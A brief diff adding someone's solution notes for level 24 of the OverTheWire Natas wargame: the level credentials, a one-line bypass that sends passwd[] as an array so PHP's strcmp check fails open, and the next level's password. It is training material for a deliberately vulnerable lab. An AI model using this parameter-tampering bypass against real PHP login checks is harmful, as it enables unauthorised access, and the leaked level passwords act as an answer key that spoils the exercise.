@@ -1,0 +1,9 @@
+URL: http://natas24.natas.labs.overthewire.org
+user: natas24
+password: OsRmXFguozKpTZZ5X14zNO43379LZveg
+
+bypass strcmp.
+Go to http://natas24.natas.labs.overthewire.org/?passwd[]=false
+strcmp will break comparing string to array.
+
+natas25 pass: GHF6X7YwACaYYssHVY05cFq83hRktl4c
